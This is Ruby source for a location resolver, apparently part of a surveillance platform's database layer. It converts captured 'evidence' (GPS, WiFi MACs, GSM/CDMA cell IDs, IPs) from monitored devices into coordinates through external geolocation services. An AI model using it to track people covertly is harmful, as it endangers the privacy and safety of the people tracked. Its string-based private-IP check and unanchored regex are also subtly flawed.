#
#  Class for translating locations (cell, wifi, ip) into coordinates
#

require_relative 'frontend'

# from RCS::Common
require 'rcs-common/trace'

require 'net/http'
require 'json'

module RCS
module DB

class PositionResolver
  extend RCS::Tracer
  
  @@cache = {}

  class << self

    def get(params)

      trace :debug, "Positioning: resolving #{params.inspect}"

      request = params.dup

      begin

        # skip resolution on request
        return {'location' => {}, 'address' => {}} if Config.instance.global['POSITION'] == false

        # check for cached values (to avoid too many external request)
        cached = get_cache params
        if cached
          trace :debug, "Positioning: resolved from cache #{cached.inspect}"
          return cached
        end

        location = {}

        if request['ip_address']
          ip = request['ip_address']['ipv4']
          # check if it's a valid ip address
          if /(?:[0-9]{1,3}\.){3}[0-9]{1,3}/.match(ip).nil? or private_address?(ip)
            return {'location' => {}, 'address' => {}}
          end
          location = get_geoip(ip)
        elsif request['location'] or request['wifi_towers'] or request['cell_towers']
          common = {request_address: true, address_language: 'en_US', version: '1.1.0', host: 'maps.google.com'}
          request.merge! common
          location = get_google(request)

          # avoid too large ranges, usually incorrect positioning
          if not location['accuracy'].nil? and location['accuracy'] > 10000
            raise "not enough accuracy: #{location.inspect}"
          end
        else
          raise "Don't know what to search for"
        end

        # remember the response for future requests
        put_cache(params, location)

        return location
      rescue Exception => e
        trace :warn, "Error retrieving location: #{e.message}"
        return {'location' => {}, 'address' => {}}
      end
    end

    def get_google(request)
      # Gears API: http://code.google.com/apis/gears/geolocation_network_protocol.html
      # Gears Wiki: http://code.google.com/p/gears/wiki/GeolocationAPI
      Timeout::timeout(5) do
        response = Frontend.proxy('POST', 'http', 'www.google.com', '/loc/json', request.to_json)
        response.kind_of? Net::HTTPSuccess or raise(response.body)
        resp = JSON.parse(response.body)
        resp['location'] or raise("invalid response: #{resp}")
      end
    end
    
    def get_geoip(ip)
      Timeout::timeout(5) do
        response = Frontend.proxy('GET', 'http', 'geoiptool.com', "/webapi.php?type=1&IP=#{ip}")
        response.kind_of? Net::HTTPSuccess or raise(response.body)
        resp = response.body.match /onLoad=.crearmapa([^)]*)/
        coords = resp.to_s.split('"')
        raise('not found') if (coords[3] == '' and coords[1] == '') or coords[3].nil? or coords[1].nil?
        {'latitude' => coords[3].to_f, 'longitude' => coords[1].to_f, 'accuracy' => 20000, 'address' => {'country' => coords[7]}}
      end
    end

    def get_cache(request)
      @@cache[request.hash]
    end

    def put_cache(request, response)
      @@cache[request.hash] = response
    end


    def decode_evidence(data)

      case data['type']
        when 'GPS'
          q = {map: {'location' => {latitude: data['latitude'], longitude: data['longitude']}}}
        when 'WIFI'
          towers = []
          data['wifi'].each do |wifi|
            towers << {mac_address: wifi[:mac], signal_strength: wifi[:sig], ssid: wifi[:bssid]}
          end
          q = {map: {'wifi_towers' => towers}}
        when 'GSM'
          q = {map: {'cell_towers' => [
              {mobile_country_code: data['cell']['mcc'], mobile_network_code: data['cell']['mnc'], location_area_code: data['cell']['lac'], cell_id: data['cell']['cid'], signal_strength: data['cell']['db'], timing_advance: data['cell']['adv'], age: data['cell']['age']}
          ], radio_type: 'gsm'}}
        when 'CDMA'
          q = {map: {'cell_towers' => [
              {mobile_country_code: data['cell']['mcc'], mobile_network_code: data['cell']['sid'], location_area_code: data['cell']['nid'], cell_id: data['cell']['bid'], signal_strength: data['cell']['db'], timing_advance: data['cell']['adv'], age: data['cell']['age']}
          ], radio_type: 'cdma'}}
        when 'IPv4'
          q = {map: {'ip_address' => {ipv4: data['ip']}}}
      end

      PositionResolver.get q[:map]
    end

    def private_address?(ip)
      return true if ip.start_with?('127.')
      return true if ip.start_with?('10.')
      return true if ip.start_with?('169.254')
      return true if ip.start_with?('192.168.')
      prefix = ip.slice(0..5)
      return true if prefix >= '172.16' and prefix <= '172.31'

      return false
    end

  end

end


end #DB::
end #RCS::
